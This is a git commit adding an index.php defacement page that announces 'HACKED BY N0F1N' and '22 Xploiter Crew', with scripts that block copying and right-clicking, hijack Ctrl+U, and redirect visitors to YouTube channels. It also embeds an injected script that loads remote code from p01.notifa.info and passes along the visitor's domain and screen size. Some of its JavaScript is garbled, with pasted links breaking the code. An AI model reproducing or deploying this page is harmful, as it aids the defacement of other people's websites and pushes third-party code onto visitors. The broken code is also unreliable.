df400bcb6ca61de7954abc4f1bfc0b0836e76cef
saepul21 <58758215+saepul21@users.noreply.github.com>
2019-12-11 09:33:54 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,103 @@
+<html><head>
+<center>
+          <!-- PAGE TITLE -->
+          <title>HACKED BY N0F1N | </title> <!-- PAGE TITLE -->
+          <title>22XPLOITERCREW| </title>
+<script language="Javascript">var msg1 = "GREETINGS FROM NOFIN  ";var speed=50;function ScrollTitle() {document.title=msg1;msg1=msg1.substring(1,msg1.length)+msg1.charAt(0);setTimeout("ScrollTitle()",speed);}ScrollTitle();</script>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
+<body bgcolor="black">
+
+<style>
+html{
+ padding-to:40px;   
+    
+}
+}
+body {
+   
+ background-image: url("https://ton.twitter.com/i/ton/data/dm/1202678088636751879/1202678051986903040/uon_OrSR.jpg:small");
+	
+background-size: cover;
+
+</style>
+<center>
+<link href="http://fonts.googleapis.com/css?family=Changa" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=Amaranth" rel="stylesheet" type="text/css">
+<center></center>
+<font face="Changa"><font size="6"><font color="white"><font color="red">HACKED BY Nofin<font color="white"> 
+<br><font face="Changa"><font size="6"><marquee width="30%"><font face="Changa"><font size="4"><font color="red"> 22 Xploiter Crew </marquee>
+</font>
+<script language='JavaScript1.2'>
+function disableselect(e){
+return false
+}
+function reEnable(){
+return true
+}
+document.onselectstart=new Function ("return false")
+if (window.sidebar){
+document.onmousedown=disableselect
+document.onclick=reEnable
+}
+
+</script>
+
+  <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAZXmRUU3h7jJGrCMkf1lcYzhCzHlv%2fP3VDge5ZySYnMhzwwl7Iy3%2fvAzhQqYZPLSpd0tHluXAk%2fhLAICU4ZCB2Ru3V0KI43kwjAXpbTCccsqa14WywMmikJhJcHi82yLY6hqC8VH5%2f7FpN6slGGcrxTppaj3OGV534Gy%2bLsWz0TQfU1QXxbZhjK2f4Hfw%2bVwXmZzgSzIHxuKmXQTW1pn1hhc7FZwH5aPlPJ7Rchi9lYO7%2fxDourexppK8GTWYZmZJ479XU0Nhv71mstHmc5MKZ1OpQs%2fzso8rcj84xhxwvy80%2bqTXDiqPqpkf4sNlYu0%2f1gUvNeoK5ouVT%2fPiYWRQejFT4lLjzMM6VXBwDshyckomcsnLz708y4If6w3b4V4nRwbn69kVSZ6V42%2fvBSOtBaQw2RJuVqi1GuGAAwlSnkf6adl57vawjvLPrsoJo7iDLn0ncNsy%2fdUlbVZhMqjWtVn8qs%2bBwQEWMyma7o1kKjkIDb%2fnXzhg1p0z64zIMje1oLZv0N2mDt%2bzBTVodmaEnsVcSP9hf8N%2byth7U8k5pR8vxBz2vk7QQA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script type='text/javascript'>
+//<![CDATA[
+shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=http://c.target ,"string"==typeof http://c.target &&(d=document.getElementById(https://t.co/SYFksUcVFl)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;http://d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);ifd.target/?e=d.target:d. …("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=http://b.target ,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="https://www.youtube.com/c/Ayy%C4%B1ld%C4%B1zTimWgt2002 …"});  //AYYILDIZ TİM WEB GRAFİK TASARIM EKİBİ //İndex ve Kodlarının İzinsiz Kullanılması Yassaktır!
+//]]>
+      </script>
+  
+  <script language="javascript" type="text/javascript">
+function jSelectShortcode(text) {
+jQuery("#yt_shorcodes").removeClass("open");
+text = text.replace(/'/g, '"');
+if(document.getElementById('jform_articletext') != null) {
+jInsertEditorText(text, 'jform_articletext');
+}
+if(document.getElementById('text') != null) {
+jInsertEditorText(text, 'text');
+}
+if(document.getElementById('jform_description') != null) {
+jInsertEditorText(text, 'jform_description');
+}
+if(document.getElementById('jform_content') != null) {
+jInsertEditorText(text, 'jform_content');
+}
+if(document.getElementById('product_desc') != null) {
+jInsertEditorText(text, 'product_desc');
+}
+SqueezeBox.close();
+}
+   </script></body>
+   <script type="text/javascript">
+<!--
+// ***********************************************
+// AYYILDIZ TİM/57.ALAY //
+// ***********************************************
+ IE(e) {
+     if (navigator.appName == "Microsoft Internet Explorer" && (event.button == "2" || event.button == "3")) {
+          alert('UYARI, AYYILDIZ TİM');
+          return false;
+     }
+}
+function NS(e) {
+     if (document.layers || (document.getElementById && !document.all)) {
+          if (e.which == "2" || e.which == "3") alert('UYARI, AYYILDIZ TİM 57. ALAY'); {
+               alert('indexi kopyalamak, düzenlemek, izinsiz kullanmak, dagitmak yasaktir!. Kullanim hakki sadece AYYILDIZ TiM birimlerine aittir. Anlayisiniz için tesekkür ederiz, Ayyildiz Tim');
+               return false;
+          }
+     }
+}
+document.onmousedown=IE;document.onmouseup=NS;document.oncontextmenu=new Function("return false");
+//-->
+</script>
+<br><br>
+
+ <meta http-equiv="refresh" content="180;URL=https://www.youtube.com/channel/UCSwODw7MbS3ZLzVXkKyq_ig/">
+
+	 </body>
+
+</head>
+</html>
